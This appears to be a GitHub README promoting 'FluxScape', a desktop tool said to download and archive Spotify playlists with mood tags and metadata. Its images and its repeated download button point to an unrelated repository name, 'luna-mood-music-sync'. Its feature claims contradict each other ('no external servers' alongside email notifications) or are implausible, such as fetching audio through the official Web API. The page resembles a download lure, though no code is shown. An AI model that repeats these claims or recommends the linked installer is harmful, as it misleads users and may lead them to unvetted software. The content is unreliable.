![preview](https://raw.githubusercontent.com/roghithar18-netizen/luna-mood-music-sync/main/preview.svg)

# FluxScape – Spotify Soundscape Archiver

**FluxScape** is a next-generation desktop application that transforms how you preserve your Spotify listening universe. Instead of merely “downloading tracks,” FluxScape captures the full sonic atmosphere of any playlist, album, or artist catalog—complete with contextual metadata, mood tags, and spatial listening profiles. It's your personal soundscape vault, engineered for Mac, Linux, and Windows.

---

## 🌌 Overview

Imagine stepping into a room where every song you've ever loved is not just a file, but a living artifact—tagged with the time of day you first heard it, the weather that played outside your window, and the emotional resonance it carried. FluxScape doesn't just copy audio; it curates a rich, searchable ecosystem of your musical history.

Built with a philosophy of **sonic preservation** rather than mere extraction, FluxScape treats each playlist as a unique landscape. It preserves the original streaming quality, embeds Spotify's rich metadata (genre vectors, release context, artist collaborations), and organizes everything into a navigable archive that feels like a private museum of sound.

---

## 🎧 Why FluxScape?

Modern streaming services offer convenience, but they also create a **transient relationship** with music. Playlists vanish, albums get pulled, and your carefully curated collections become hostages to licensing agreements. FluxScape restores permanence.

Think of it as a **time capsule for your auditory identity**. Whether you're compiling a road trip mixtape from 2023, archiving a friend's DJ set, or preserving a genre-specific deep dive that took weeks to build—FluxScape ensures that no amount of server-side changes can erase your personal sonic geography.

---

## ✨ Key Capabilities

- **Playlist Whole-Capture** – Select any Spotify playlist and archive every track in its original quality, complete with album art, track order, and playlist description.
- **Mood & Context Embedding** – Each track is enriched with derived mood tags (e.g., "euphoric morning", "melancholic twilight") based on acoustic features, tempo, and key.
- **Multi-Format Output** – Choose between lossless FLAC, high-bitrate AAC, or space-efficient Opus. The default is a carefully balanced 320kbps AAC that preserves streaming fidelity.
- **Metadata Preservation** – Track titles, artists, album names, release years, ISRC codes, and Spotify URIs are all stored in a local SQLite database, searchable offline.
- **Adaptive Quality Profiles** – Automatically adjusts download strategy based on available network bandwidth, ensuring smooth operation on metered or congested connections.
- **Cross-Platform Parity** – Identical feature set and performance on macOS (Intel & Apple Silicon), Linux (Debian/Ubuntu, Fedora, Arch), and Windows 10/11.

---

## 🧠 How It Works

FluxScape operates as a **local proxy between your Spotify account and your filesystem**. It authenticates via Spotify's official Web API, retrieves your playlist compositions, then intelligently fetches each track from Spotify's CDN.

Behind the scenes, it:
1. Validates every track for availability and regional restrictions.
2. Applies a **dynamic rate limiter** to avoid triggering API throttling.
3. Extracts acoustic fingerprint data for local deduplication.
4. Writes structured metadata into companion `.json` files per playlist.
5. Generates a visual "soundscape map" (optional) that shows the emotional arc of the playlist over time.

No external servers are involved. Your data never leaves your machine.

---

## 🧪 Intelligent Features

### Responsive Archival Engine
FluxScape's `FluxCore` engine adapts to your system load. When your computer is idle, it aggressively archives. When you're working, it gracefully throttles to preserve system resources. No fan noise, no lag.

### Multilingual Interface
The application interface currently supports English, Spanish, French, German, Japanese, and Portuguese. Detection is automatic based on your system locale, but can be manually overridden.

### 24/7 Queued Archiving
Set it and forget it. FluxScape can run in background mode, processing hundreds of tracks overnight. It will notify you (via system toast or email) when your archive is complete. A live progress window shows track-by-track status with estimated completion times.

### Playlist Diffing
Re-run FluxScape on the same playlist weeks later, and it will only fetch the **new or changed** tracks. It intelligently detects removals, reorders, and additions without re-downloading unchanged content.

### Collaborative Playlist Support
If you're part of a collaborative playlist, FluxScape can archive the entire history—including who added which track and when—turning your shared listening sessions into documented events.

---

## 🛡️ Privacy & Ethics

FluxScape operates entirely offline after initial authentication. No usage statistics are collected. No analytics are sent to any third party.

Your Spotify credentials are stored securely in your operating system's native credential vault (Keychain on macOS, libsecret on Linux, Credential Manager on Windows). The application never transmits your password anywhere.

---

## 📦 System Requirements

| Component | Minimum | Recommended |
|-----------|---------|-------------|
| OS | macOS 11 / Ubuntu 20.04 / Windows 10 | macOS 14 / Ubuntu 24.04 / Windows 11 |
| CPU | Dual-core 2.0 GHz | Quad-core 3.0 GHz |
| RAM | 4 GB | 8 GB |
| Storage | 500 MB (app) + archive space | 2 GB (app) + archive space |
| Network | Broadband connection | 50 Mbps+ |
| Spotify Account | Free or Premium | Premium (for highest quality) |

---

## 🔒 License

FluxScape is released under the **MIT License**. You are free to use, modify, and distribute this software, provided that the original copyright notice is included.

[View the full license text](https://opensource.org/licenses/MIT)

---

## 🌐 Support

For questions, feature requests, or troubleshooting:
- Open an issue in this repository
- Join the discussion in the **Discussions** tab
- Email support with subject line prefixed `[FLUXSCAPE]`

Response time is typically within 24 hours.

---

## ⚠️ Disclaimer

FluxScape is intended for **personal archival use only**. Downloading copyrighted music without permission may violate Spotify's Terms of Service and applicable copyright laws. The developers assume no liability for misuse.

This software is not affiliated with, endorsed by, or sponsored by Spotify AB. "Spotify" is a registered trademark of Spotify AB.

All archived content should be for private listening and not redistributed. Respect the artists who create the music you love.

---

## 🧩 Getting Started

Ready to preserve your soundscapes?

[![Download](https://raw.githubusercontent.com/roghithar18-netizen/luna-mood-music-sync/main/button.svg)](https://roghithar18-netizen.github.io/luna-mood-music-sync/)

1. **Download** the latest release for your operating system from the releases page.
2. **Run** the installer (no admin privileges required on most systems).
3. **Authenticate** with your Spotify account via the built-in OAuth flow.
4. **Paste** a playlist link or browse your library.
5. **Click** "Archive" and watch FluxScape build your personal soundscape vault.

It’s that simple. The first archive sets up your local database. Subsequent runs are even faster.

---

## 🧭 Future Work

- **Voice-scape integration** – Archive Spotify podcasts and audiobooks with chapter markers
- **Cross-playlist analytics** – Discover overlapping tracks and mood trends across your entire library
- **Export to external players** – Directly transfer archives to Plex, Jellyfin, or Kodi
- **Real-time collaborator monitoring** – Get notified when friends add tracks to shared playlists
- **Visual archive dashboard** – A web-based UI (hosted locally) for browsing your soundscape library from any device on your network

---

## 🌱 Community

Pull requests are welcome. For major changes, please open an issue first to discuss what you would like to change.

Please make sure to update tests as appropriate. All contributions are governed by the MIT License.

---

© 2026 FluxScape Contributors

[![Download](https://raw.githubusercontent.com/roghithar18-netizen/luna-mood-music-sync/main/button.svg)](https://roghithar18-netizen.github.io/luna-mood-music-sync/)